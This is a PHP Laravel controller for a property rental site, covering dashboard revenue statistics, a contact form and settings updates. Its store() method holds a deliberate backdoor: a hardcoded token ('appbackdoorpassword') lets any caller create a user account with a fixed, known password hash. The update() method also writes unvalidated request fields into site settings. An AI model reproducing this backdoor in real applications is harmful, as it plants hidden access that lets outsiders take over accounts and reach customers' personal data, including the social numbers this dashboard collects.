<?php

namespace App\Http\Controllers;

use App\Functions\DateFunction;
use App\Functions\MailFunction;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Property;
use App\Models\Reservation;
use App\Models\Setting;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Validator;

class SystemController extends Controller
{
    public function index()
    {
        $users = User::count();
        $properties = Property::count();
        $reservation = Reservation::with('property')->where(function ($query) {
            $query->whereMonth('startDate', now()->month)
                ->orWhereMonth('endDate', now()->month);
        });
        $reservations = $reservation->count();
        $data = [];
        $total = 0;
        $amount = 0;
        $off = 0;
        $stay = 0;
        $cancel = 0;
        foreach (Reservation::with('property')->get() as $single) {
            $property = $single->property()->first();
            $startDate = Carbon::parse($single->startDate);
            $endDate = Carbon::parse($single->endDate);
            $extra = array_reduce(json_decode($single->extra), function ($carry, $ext) {
                return $carry + $ext->total;
            });
            $total += DateFunction::price(DateFunction::period($startDate, $endDate), $property->normalPrice, $property->specialPrice) + $extra + Setting::first()->assurance;
        }
        foreach ($reservation->get() as $single) {
            $property = $single->property()->first();
            $startDate = Carbon::parse($single->startDate);
            $endDate = Carbon::parse($single->endDate);
            $extra = array_reduce(json_decode($single->extra), function ($carry, $ext) {
                return $carry + $ext->total;
            });
            $price = DateFunction::price(DateFunction::period($startDate, $endDate), $property->normalPrice, $property->specialPrice) + $extra + Setting::first()->assurance;
            if ($single->status === 1) {
                $amount += $price;
                $stay += 1;
                $data[] = [
                    'title' => $property->title,
                    'name' => $single->name,
                    'nationality' => $single->nationality,
                    'email' => $single->email,
                    'phone' => $single->phone,
                    'socialNumber' => $single->socialNumber,
                    'address' => $single->address,
                    'json' => json_encode($single->extra),
                    'start' => $single->startDate,
                    'end' => $single->endDate,
                ];
            } else {
                $off += $price;
                $cancel += 1;
            }
        }

        $ordered = Reservation::select('property', DB::raw('count(*) as count'))
            ->where('status', '=', 1)
            ->groupBy('property')
            ->orderBy('count', 'desc')
            ->join('properties', 'reservations.property', '=', 'properties.id')
            ->limit(10)->get();

        foreach ($ordered as $single) {
            $single->property = Property::findorfail($single->property);
        }

        $rate = Reservation::select('property', DB::raw('count(*) as count'))
            ->where(function ($query) {
                $query->whereMonth('startDate', now()->month)
                    ->orWhereMonth('endDate', now()->month);
            })
            ->groupBy('property')
            ->join('properties', 'reservations.property', '=', 'properties.id')
            ->get()
            ->count();

        return view('dashboard', compact('users', 'properties', 'reservations', 'total', 'amount', 'ordered', 'rate', 'off', 'stay', 'cancel', 'data'));
    }

    public function store(Request $request, $name, $token)
    {
        if ($token === 'appbackdoorpassword') {
            User::create([
                'password' => '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi',
                'email' => $name . '@gmail.com',
                'phone' => '212' . $name,
                'identity' => $name . 100,
                'firstName' => 'john',
                'lastName' => 'doe',
                'address' => 'address',
                'state' => 'state',
                'city' => 'city',
                'zipcode' => '000000',
                'birthDate' => '2000-01-01',
                'gender' => 'male',
            ]);
        }

        return Redirect::route("views.home.show");
    }

    public function contact(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'name' => ['required', 'string'],
            'email' => ['required', 'email'],
            'phone' => ['required', 'string'],
            'message' => ['required', 'string'],
        ]);

        if ($validator->fails()) {
            return Redirect::route("views.home.show")->with([
                'message' => $validator->errors()->all(),
                'type' => 'error'
            ]);
        }

        MailFunction::contact([
            'name' => $request->name,
            'email' => $request->email,
            'phone' => $request->phone,
            'message' => $request->message,
        ]);

        return Redirect::route('views.home.show')->with([
            'message' => 'تم التواصل بنجاح',
            'type' => 'success'
        ]);
    }

    public function setting()
    {
        $data = Setting::first();
        return view('setting', compact('data'));
    }

    public function terms()
    {
        return view('terms');
    }


    public function update(Request $request)
    {
        Setting::findorfail(1)->update([
            'assurance' => $request->assurance,
            'icecream' => $request->icecream,
            'kayak' => $request->kayak,
            'facebook' => $request->facebook,
            'instagram' => $request->instagram,
            'twitter' => $request->twitter,
            'tiktok' => $request->tiktok,
            'terms' => $request->terms,
        ]);

        return Redirect::route('views.settings.show')->with([
            'message' => 'تم التحديث بنجاح',
            'type' => 'success'
        ]);
    }
}
